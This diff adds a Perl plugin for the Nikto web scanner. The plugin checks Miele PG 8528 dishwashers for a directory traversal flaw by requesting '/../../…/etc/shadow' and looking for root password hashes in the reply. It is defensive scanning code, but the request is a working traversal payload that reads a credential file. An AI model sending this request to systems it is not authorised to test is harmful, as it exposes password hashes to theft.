@@ -1,0 +1,45 @@
+#VERSION,2.20
+###############################################################################
+#  Copyright (C) 2017 Chris Sullo
+#
+#  This program is free software; you can redistribute it and/or
+#  modify it under the terms of the GNU General Public License
+#  as published by the Free Software Foundation; version 2
+#  of the License only.
+#
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU General Public License for more details.
+#
+#  You should have received a copy of the GNU General Public License
+#  along with this program; if not, write to
+#  Free Software Foundation, 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
+###############################################################################
+# PURPOSE:
+# Check for the Miele Professional PG 8528 directory traversal vulnerability
+###############################################################################
+sub nikto_dishwasher_init {
+    my $id = { name        => "dishwasher",
+               full_name   => "dishwasher",
+               author      => "Jeremy Bae",
+               description => "Look for the dishwasher directory traversal vulnerability.",
+               hooks       => { scan => { method => \&nikto_dishwasher, weight => 20 }, },
+               copyright   => "2017 Chris Sullo",
+             };
+
+    return $id;
+}
+
+sub nikto_dishwasher {
+    my ($mark, $parameters) = @_;
+    my $path = "/../../../../../../../../../../../../etc/shadow";
+
+    my ($res, $content, $error, $request, $response) = nfetch($mark, $path, "GET", "", "", "", "dishwasher");
+
+    if (($response->{'server'} =~ 'PST10 WebServer') && ($content =~ 'root:\$1\$.*')) {
+        add_vulnerability($mark, "$path: Site appears vulnerable to the dishwasher directory traversal vulnerability.", 999951, 0, "GET", $path, $request, $response);
+    }
+}
+
+1;
